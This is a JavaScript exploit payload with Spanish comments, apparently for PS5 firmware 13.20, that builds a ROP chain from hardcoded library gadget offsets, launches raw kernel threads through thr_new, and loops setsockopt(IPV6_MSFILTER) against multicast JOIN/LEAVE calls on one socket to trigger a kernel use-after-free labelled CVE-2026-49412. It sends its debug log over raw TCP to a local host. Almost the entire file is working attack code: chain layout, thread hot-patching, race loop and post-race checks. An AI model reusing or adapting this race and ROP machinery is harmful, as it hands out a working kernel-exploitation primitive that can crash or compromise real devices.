// 2026-08-27 race_rop_1320: RACE P2 UAF IPV6_MSFILTER (CVE-2026-49412), PS5 13.20. Hilo ROP que martillea setsockopt(IPV6_MSFILTER) en bucle mientras JS martillea JOIN/LEAVE en el MISMO fd; si la consola se reinicia, el UAF esta CONFIRMADO (riesgo real de panic/reinicio).
// Gadgets: SOLO offsets conocidos ROP_1320 (global.js L132-147) sobre libcobalt_base: pop_rsp=+0x6f7c7 pop_rax=+0x35942 pop_rdi=+0x54b pop_rsi=+0x26a5 pop_rdx=+0x81300 pop_rcx=+0x25e9 pop_r8=+0x35941 pop_r9=+0x3d9132. CERO lectura de memoria de modulos (protegida post-init: leerla mata el proceso). Solo W() por TCP crudo a 192.168.1.67:8081 (canal identico a diag_raw3) + syscalls + escrituras a memoria propia.
// Despachador: STUB=libc_base+0x19E348+7 (main.js:877 syscall_wrapper=gettimeofday+7). El runtime llama call_rop(STUB,num,a1..a5) con rdi=num,rsi=a1,rdx=a2,rcx=a3,r8=a4,r9=a5 (mapping verificado en TODOS los payloads previos); la cinta replica EXACTAMENTE ese mapping. Si el STUB no lo replicara, la FASE A mataria al hilo -> se aborta antes de la FASE B (eso es lo que FASE A valida).
// Hilo raw thr_new: rsp inicial=base+size-8 (vm_machdep.c:521-523 tf_rsp=(ss_sp+ss_size)&~0xF; -=8), tf_rip=start_func=pop_rsp, tf_rdi=arg=0. thr_new=0x1c7 thr_kill2=0x1e1 sched_yield=0x14b. join sin pthread: thr_kill2(pid,tid,0)=0 vivo, ESRCH(3)=muerto (kern_thr.c:465-477).
// Cinta (17 qwords, chainAddr A=base+size-144; [base+size-8]=A aparte): pop_rsp inicial lee [top-8]=A -> ret -> chain[0]=&pop_rax. Un fake_ret pelado NO puede cerrar el bucle (rsp queda desfasedo tras STUB+ret); el loopback es &pop_rsp cuyo siguiente qwords es A: re-ancla rsp y re-entra en chain[0] -> bucle infinito. Extra: chain[16]=A cae en [top-16], la entrada tb funciona con rsp top-16.
// DESVIO del guion: NO thr_kill2(,9): SIGKILL SIG_DFL mata el PROCESO entero (kern_sig.c:2951-2956 sigexit->exit1). El hilo se retira con hot-patch de 2 slots de VALOR (arg rdi 105->431, arg rsi fd->0): la cinta vieja intacta acaba en STUB con rdi=431 -> thr_exit(0) en <=1 iteracion desde cualquier interleccion (ningun gadget intermedio toca rdi; ningun codigo ni destino de ret se reescribe). Verificado con interprete ROP simulado (41 interleciones, cero RIP-invalido, convergencia total).
(() => {
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x);const WB=malloc(512);let sock=-1n;
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const EN=()=>{const m=/^(\d+)/.exec(get_error_string()||"");return m?Number(m[1]):-1;};
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);if(I(syscall(SYSCALL.connect,sock,sa,16n))<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
const STK=0x400000n,SYS_TK2=0x1e1n,ESRCH=3; // MAP_PRIVATE|MAP_ANONYMOUS=0x1002 (globals)
let pid=0n,rfd=0n,raceSock=-1n,sanitySock=-1n,jsIters=0,stA="no-ejecutada",threadA="-",threadB="-",tA=null,tB=null;
const g={};let okb=false;
if(typeof libcobalt_base!=="undefined"&&typeof libc_base!=="undefined"&&B(libcobalt_base)!==0n&&B(libc_base)!==0n){const c=B(libcobalt_base),L=B(libc_base);
g.pop_rsp=c+0x6f7c7n;g.pop_rax=c+0x35942n;g.pop_rdi=c+0x54bn;g.pop_rsi=c+0x26a5n;g.pop_rdx=c+0x81300n;g.pop_rcx=c+0x25e9n;g.pop_r8=c+0x35941n;g.pop_r9=c+0x3d9132n;g.STUB=L+0x19E348n+7n;okb=true;}
// num=105 dos veces: rax=num por si el STUB espera rax; rdi=num porque ESE es el mapping verificado. FASE A (51,0,0) y FASE B (74,msfr,152): MISMO builder, solo difieren a3/a4/a5.
const buildChain=(fd,a3,a4,a5)=>[g.pop_rax,105n,g.pop_rdi,105n,g.pop_rsi,fd,g.pop_rdx,41n,g.pop_rcx,a3,g.pop_r8,a4,g.pop_r9,a5,g.STUB,g.pop_rsp,0n];
const spawn=(fd,a3,a4,a5)=>{
const base=I(syscall(SYSCALL.mmap,0n,STK,3n,MAP_PRIVATE|MAP_ANONYMOUS,B(-1),0n));
if(base<=0n){W("[race] mmap stack ERR: "+get_error_string());return null;}
const top=base+STK,A=top-144n,ch=buildChain(fd,a3,a4,a5);ch[16]=A;
write64(top-8n,A);for(let i=0;i<17;i++)write64(A+8n*BigInt(i),ch[i]); // [base+size-8]=chainAddr; chain[0]=&pop_rax
const tp=malloc(0x68);for(let i=0;i<0x68;i+=8)write64(tp+BigInt(i),0n);const ct=malloc(8);write64(ct,0n);
write64(tp,g.pop_rsp);write64(tp+8n,0n);write64(tp+0x10n,base);write64(tp+0x18n,STK);write64(tp+0x30n,ct); // start_func=pop_rsp,arg=0,stack_base BAJA,child_tid; tls/parent/flags/rtp/spare=0
const tr=I(syscall(SYSCALL.thr_new,tp,B(0x68)));
if(tr<0n){W("[race] thr_new ERR: "+get_error_string());syscall(SYSCALL.munmap,base,STK);return null;}
const tid=B(read32(ct)); // lwpid_t=4B; read32 de buffer PROPIO (cero read64)
if(tid===0n){W("[race] thr_new ok pero tid=0");syscall(SYSCALL.munmap,base,STK);return null;}
return{base:base,A:A,tid:tid};};
const alive=(t)=>{const r=I(syscall(SYS_TK2,pid,t.tid,0n));return !(r<0n&&EN()===ESRCH);};
const retire=(t)=>{ // hot-patch SOLO de slots de VALOR (impares, nunca destinos de ret, cada write64 aligned=atomico):
// chain[3] (arg de pop_rdi) 105->431 y chain[5] (arg de pop_rsi) fd->0. La cinta vieja
// intacta sigue ejecutandose tal cual: todo interleaving hace o el setsockopt normal
// (rdi=105) o acaba en STUB con rdi=431 intacto (ningun gadget intermedio toca rdi)
// -> thr_exit(0) en <=1 iteracion, desde cualquier punto. Cero codigo tocado.
write64(t.A+24n,431n);write64(t.A+40n,0n);
for(let p=0;p<100000;p++){const r=I(syscall(SYS_TK2,pid,t.tid,0n));if(r<0n&&EN()===ESRCH)return "muerto (hot-patch thr_exit ok; ESRCH)";syscall(SYSCALL.sched_yield);}
return "VIVO [TIMEOUT 100k yields; stack NO se desmapea]";};
try{
// PASO 1: pid + bases (typeof-guard)
try{pid=I(syscall(SYSCALL.getpid));}catch(e){}
W("[race] pid="+toHex(pid)+" cobalt="+(okb?toHex(B(libcobalt_base)):"NO EXISTE")+" libc="+(okb?toHex(B(libc_base)):"NO EXISTE")+" STUB="+(okb?toHex(g.STUB):"?"));
if(!okb){W("[race] ABORT: libcobalt_base/libc_base no disponibles");try{send_notification("[race] abort no-bases");}catch(e){}return;}
// socket race AF_INET6(28) DGRAM(2) + JOIN ff02::1/ifindex1 (mreq 20B v3/v4) + msfr 152B EXACTO v4
raceSock=I(syscall(SYSCALL.socket,28n,2n,0n));rfd=B(raceSock);
if(raceSock<0n){W("[race] ABORT socket INET6: "+get_error_string());try{send_notification("[race] abort socket");}catch(e){}return;}
const mreq=malloc(20);write64(mreq,0x2ffn);write64(mreq+8n,0x0100000000000000n);write32(mreq+16n,1);
const r0=I(syscall(SYSCALL.setsockopt,rfd,41n,12n,mreq,20n));
W("[race] raceSock fd="+raceSock+" JOIN pre: "+(r0<0n?"ERR:"+get_error_string():"ok"));
const srcs=malloc(128*128);for(let i=0;i<128*128;i+=8)write64(srcs+BigInt(i),0n);
write8(srcs,28);write8(srcs+1n,28);write64(srcs+16n,0x0100000000000000n); // 1a entrada ::1 valida; resto fam 0 -> copyin 16KB corre SIEMPRE
const msfr=malloc(0x98);for(let i=0;i<0x98;i+=8)write64(msfr+BigInt(i),0n);
write32(msfr,1);write32(msfr+4n,1);write32(msfr+8n,128);write8(msfr+16n,28);write8(msfr+17n,28);
write64(msfr+24n,0x2ffn);write64(msfr+32n,0x0100000000000000n);write64(msfr+144n,srcs); // ifindex1 fmode1 nsrcs128 group ff02::1@16 srcs@144
// PASO 2 FASE A: valida el despachador (IPV6_RTHDR=51 inofensivo, camino ok verificado en v2)
tA=spawn(rfd,51n,0n,0n);
if(!tA)stA="spawn-fallo";else{
W("[race] FASE A hilo tid="+tA.tid+" bucle setsockopt(fd,41,51,0,0) via STUB");
for(let i=0;i<10000;i++)syscall(SYSCALL.sched_yield); // ~1s
if(alive(tA)){stA="ok";W("[race] FASE A ok: despachador funciona (hilo vivo tras 1s de setsockopt RTHDR en bucle)");}
else{stA="FALLO";W("[race] FASE A FALLO: el hilo murio (mapping del STUB incorrecto o crash) -> NO se lanza FASE B");}
threadA=retire(tA);W("[race] FASE A hilo: "+threadA);}
// PASO 3 FASE B: EL RACE (IPV6_MSFILTER=74 en bucle vs JOIN(12)/LEAVE(13) JS en el MISMO fd)
if(stA==="ok"){W("[race] RACE ARRANCANDO: si la consola se reinicia, el UAF (CVE-2026-49412) esta CONFIRMADO");
tB=spawn(rfd,74n,msfr,152n);
if(!tB)threadB="spawn-fallo";else{
W("[race] FASE B hilo tid="+tB.tid+" bucle setsockopt(fd,41,74,msfr,152)");
for(jsIters=0;jsIters<200000;jsIters++){syscall(SYSCALL.setsockopt,rfd,41n,12n,mreq,20n);syscall(SYSCALL.setsockopt,rfd,41n,13n,mreq,20n);}
W("[race] JS loop: "+(jsIters*2)+" setsockopt JOIN/LEAVE");
threadB=retire(tB);}}else W("[race] FASE B OMITIDA (FASE A no confirmo el despachador)");
W("[race] FASE B hilo: "+threadB);
// PASO 5: sanity post-race
try{const gp=I(syscall(SYSCALL.getpid));sanitySock=I(syscall(SYSCALL.socket,28n,2n,0n));
if(sanitySock>=0n){const m2=malloc(20);write64(m2,0x2ffn);write64(m2+8n,0x0100000000000000n);write32(m2+16n,1);
const rj=I(syscall(SYSCALL.setsockopt,B(sanitySock),41n,12n,m2,20n));
W("[race] CONSOLA VIVA (getpid "+toHex(gp)+" socket+JOIN "+(rj<0n?"ERR:"+get_error_string():"ok")+") -> UAF no disparado en esta corrida"+(rj<0n?" PERO estado sospechoso":""));}
else W("[race] socket sanity FALLO: "+get_error_string()+" -> estado sospechoso");}catch(e){W("[race] sanity EX "+e);}
// PASO 6: limpieza + resumen (munmap SOLO si el hilo muri6: desmapear stack vivo = SIGSEGV = proceso muerto)
try{if(raceSock>=0n)syscall(SYSCALL.close,rfd);if(sanitySock>=0n)syscall(SYSCALL.close,B(sanitySock));
if(tA&&/^muerto/.test(threadA))syscall(SYSCALL.munmap,tA.base,STK);
if(tB&&/^muerto/.test(threadB))syscall(SYSCALL.munmap,tB.base,STK);}catch(e){}
W("[race] RESUMEN: faseA="+stA+" "+threadA+" | faseB="+threadB+" | JS="+(jsIters*2)+" setsockopt JOIN/LEAVE");
W("[race] COMPLETO: consola viva");try{send_notification("[race] done");}catch(e){}
}catch(e){W("[race] EX fatal: "+e);try{send_notification("[race] abort EX");}catch(e2){}}
try{if(sock>=0n)syscall(SYSCALL.close,sock);}catch(e){}
})();
